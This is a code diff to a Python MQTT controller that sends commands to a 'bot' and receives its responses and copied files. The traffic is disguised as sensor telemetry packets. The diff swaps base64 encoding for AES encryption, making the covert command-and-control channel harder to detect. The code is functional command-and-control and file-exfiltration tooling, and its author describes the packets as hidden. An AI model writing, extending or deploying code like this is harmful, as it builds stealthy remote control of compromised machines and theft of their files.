@@ -3,13 +3,16 @@ import json
 import time
 import paho.mqtt.client as mqtt
 from consts import *
+from utils import encrypt_payload_AES_then_b64, decrypt_payload
+
 
 # This runs whenever the bot sends a response back to the 'sensors' topic
 def on_message(client, userdata, msg):
     try:
         packet = json.loads(msg.payload.decode())
-        if packet.get("s_id") == STEALTH_ID:
-            raw_res = base64.b64decode(packet.get("payload")).decode()
+        if packet.get("s_id") == BOT_ID:
+            encrypted_payload = packet.get(DATA_KEY)
+            raw_res = decrypt_payload(encrypted_payload)
             if "FILE_B64:" in raw_res:
                 save_file_from_message(raw_res)
             else:
@@ -27,6 +30,15 @@ def save_file_from_message(raw_res):
         print(f"[SYSTEM]: Successfully copied file: {filename}, saved as copied_{filename}")
     except Exception as e:
         print(f"[SYSTEM]: Error decoding binary file: {e}")
+
+
+def create_packet(encrypted_b64_payload):
+    packet = {
+        "s_id": CONTROLLER_ID,
+        "type": "telemetry",
+        DATA_KEY: encrypted_b64_payload
+    }
+    return packet
 
 
 if __name__ == '__main__':
@@ -57,23 +69,15 @@ if __name__ == '__main__':
 
                 for test in test_suite:
                     print(f"[*] Testing: {test}")
-                    b64_payload = base64.b64encode(test.encode()).decode()
-                    packet = {
-                        "s_id": STEALTH_ID,
-                        "type": "telemetry",
-                        "data": b64_payload
-                    }
-                    client.publish(TOPIC, f"{BOT_ID}:{test}")
+                    encrypted_b64_payload = encrypt_payload_AES_then_b64(test)
+                    packet = create_packet(encrypted_b64_payload)
+                    client.publish(TOPIC, json.dumps(packet))
                     time.sleep(1) # Wait for bot response before next test
                 continue
 
-            b64_payload = base64.b64encode(cmd.encode()).decode()
+            encrypted_b64_payload = encrypt_payload_AES_then_b64(cmd)
             # hide data in base64
-            packet = {
-                "s_id": STEALTH_ID,
-                "type": "telemetry",
-                "data": b64_payload
-            }
+            packet = create_packet(encrypted_b64_payload)
 
             print("----")
             print(f"[DEBUG]: showcase of the hidden packet being sent:")
